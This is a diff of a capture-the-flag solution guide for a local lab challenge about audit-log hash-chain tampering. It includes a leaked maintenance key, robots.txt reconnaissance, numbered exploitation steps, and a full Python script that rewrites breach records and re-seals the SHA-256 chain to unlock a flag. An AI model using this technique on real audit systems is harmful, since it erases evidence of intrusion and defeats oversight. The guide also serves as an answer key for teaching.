@@ -1,56 +1,110 @@
-# A09 Hard: Solution Guide
+# A09 Hard: Cryptographic Audit Hash-Chain Tampering - Solution Guide
 
 ### Vulnerability Analysis
-1. Attempting to access `/vault/classified` appends an `UNAUTHORIZED_BREACH_DETECTED` block into the audit ledger.
-2. In `/static/js/titan_audit.js`, the developer left comments exposing the administrative maintenance endpoints and token:
-   `// Master maintenance token: TITAN_SEC_MAINT_2026`
-3. If an attacker edits the ledger event without recomputing the SHA-256 chain, the Sentinel fails validation due to a broken hash chain (`prev_hash` mismatch).
-4. By invoking the maintenance API to tamper with the block and subsequently calling `/api/v1/audit/recompute-chain`, the audit evidence is completely erased and the hash chain is re-sealed.
+1. **Unprotected Administrative Certificate in Historical Audit Event:**
+   - Navigating to `/audit/ledger` (or querying the JSON endpoint `GET /api/v1/audit/ledger`) reveals historical system blocks.
+   - Block #1 (`SYSTEM_BOOT`) logs the initialization of services containing the operational certificate:
+     `Maintenance Certificate: cert_titan_secops_7719`
+2. **Robots Reconnaissance:**
+   - Querying `GET /robots.txt` reveals disallowed administrative paths:
+     - `/audit/console`
+     - `/vault/classified`
+     - `/api/v1/audit/`
+3. **Sentinel Intrusion Interlock:**
+   - Attempting to view `/vault/classified` triggers Sentinel access control checks. The vault is locked because Block #2 records an `UNAUTHORIZED_BREACH_DETECTED` event.
+4. **Cryptographic Consensus Tampering:**
+   - The endpoint `POST /api/v1/audit/tamper-block` allows authorized SecOps personnel to redact block events, but does not automatically recompute descendant cryptographic hashes.
+   - Hash formula:
+     `hash = SHA-256(f"{index}|{prev_hash}|{timestamp}|{event_type}|{details}")`
+   - To bypass Sentinel lockdown, an attacker must redact the breach block and programmatically recalculate the forward SHA-256 hash chain for all subsequent blocks.
+
+---
 
 ### Exploitation Steps
-1. Make an initial request to `/vault/classified` (this triggers the breach entry).
-2. Retrieve the ledger from `GET /audit/ledger` and find the index of the `UNAUTHORIZED_BREACH_DETECTED` block.
-3. Submit a POST request to `/api/v1/audit/tamper-block` with:
-   - `index: <BREACH_INDEX>`
-   - `event_type: ROUTINE_SECURITY_PATROL`
-   - `details: Routine maintenance check`
-   - `admin_key: TITAN_SEC_MAINT_2026`
-4. Submit a POST request to `/api/v1/audit/recompute-chain` with:
-   - `admin_key: TITAN_SEC_MAINT_2026`
-5. Access `/vault/classified` within the same session and retrieve the dynamic flag.
+1. Fetch the complete ledger via `GET /api/v1/audit/ledger`.
+2. Extract the SecOps maintenance key (`cert_titan_secops_7719`) from Block #1.
+3. Identify all blocks containing `"BREACH"` in `event_type`.
+4. Overwrite their `event_type` with clean values (e.g. `ROUTINE_SECURITY_PATROL`).
+5. Sequentially recalculate `prev_hash` and `hash` forward from the tampered block to the end of the chain.
+6. Push each updated block to `POST /api/v1/audit/tamper-block`.
+7. Request `GET /vault/classified` using the same session to extract the dynamic flag.
+
+---
 
 ### Exploit Script
 ```python
+import hashlib
 import re
 import requests
 
 BASE_URL = "http://127.0.0.1:6027"
-s = requests.Session()
+ADMIN_KEY = "cert_titan_secops_7719"
 
-# 1. Trigger initial breach event
-s.get(f"{BASE_URL}/vault/classified")
+def compute_hash(idx, prev_hash, ts, event_type, details):
+    content = f"{idx}|{prev_hash}|{ts}|{event_type}|{details}".encode('utf-8')
+    return hashlib.sha256(content).hexdigest()
 
-# 2. Inspect ledger to find breach block index
-ledger_html = s.get(f"{BASE_URL}/audit/ledger").text
-match = re.findall(r'#(\d+)</strong>.*?UNAUTHORIZED_BREACH_DETECTED', ledger_html, re.DOTALL)
-breach_index = int(match[-1])
-print(f"[+] Found breach event at block #{breach_index}")
+def exploit():
+    session = requests.Session()
 
-# 3. Tamper with the breach block
-tamper_resp = s.post(f"{BASE_URL}/api/v1/audit/tamper-block", data={
-    "index": breach_index,
-    "event_type": "ROUTINE_SECURITY_PATROL",
-    "details": "Routine biometric calibration",
-    "admin_key": "TITAN_SEC_MAINT_2026"
-})
+    # 1. Fetch current ledger
+    resp = session.get(f"{BASE_URL}/api/v1/audit/ledger")
+    data = resp.json()
+    ledger = data["ledger"]
+    print(f"[*] Fetched {len(ledger)} blocks from ledger.")
 
-# 4. Recompute the hash chain
-recompute_resp = s.post(f"{BASE_URL}/api/v1/audit/recompute-chain", data={
-    "admin_key": "TITAN_SEC_MAINT_2026"
-})
+    # 2. Identify breach block and redact
+    tampered_from = None
+    for i, block in enumerate(ledger):
+        if "BREACH" in block["event_type"]:
+            print(f"[!] Found breach event at block #{block['index']}: {block['event_type']}")
+            block["event_type"] = "ROUTINE_SECURITY_PATROL"
+            block["details"] = "Routine perimeter security patrol completed successfully"
+            if tampered_from is None:
+                tampered_from = i
 
-# 5. Access classified vault and claim flag
-vault_resp = s.get(f"{BASE_URL}/vault/classified")
-flag = re.search(r"RTSA\{[^}]+\}", vault_resp.text).group(0)
-print(f"[+] Dynamic Flag: {flag}")
+    if tampered_from is None:
+        print("[-] No breach blocks detected.")
+        return
+
+    # 3. Recalculate forward cryptographic hash chain
+    print(f"[*] Recalculating cryptographic hash chain forward from block #{tampered_from}...")
+    for i in range(tampered_from, len(ledger)):
+        if i > 0:
+            ledger[i]["prev_hash"] = ledger[i - 1]["hash"]
+        ledger[i]["hash"] = compute_hash(
+            ledger[i]["index"],
+            ledger[i]["prev_hash"],
+            ledger[i]["timestamp"],
+            ledger[i]["event_type"],
+            ledger[i]["details"]
+        )
+
+        # 4. Push updated block to API
+        payload = {
+            "index": ledger[i]["index"],
+            "event_type": ledger[i]["event_type"],
+            "details": ledger[i]["details"],
+            "prev_hash": ledger[i]["prev_hash"],
+            "hash": ledger[i]["hash"],
+            "timestamp": ledger[i]["timestamp"],
+            "admin_key": ADMIN_KEY
+        }
+        update_resp = session.post(f"{BASE_URL}/api/v1/audit/tamper-block", json=payload)
+        if not update_resp.json().get("success"):
+            print(f"[-] Failed updating block #{ledger[i]['index']}: {update_resp.text}")
+            return
+        print(f"[+] Block #{ledger[i]['index']} successfully tampered and re-hashed.")
+
+    # 5. Verify Sentinel access and recover flag
+    vault_resp = session.get(f"{BASE_URL}/vault/classified")
+    flag_match = re.search(r"RTSA\{[^}]+\}", vault_resp.text)
+    if flag_match:
+        print(f"\n[+] SUCCESS! Captured Classified Flag: {flag_match.group(0)}")
+    else:
+        print("[-] Vault still locked. Response content:")
+        print(vault_resp.text[:500])
+
+if __name__ == '__main__':
+    exploit()
 ```
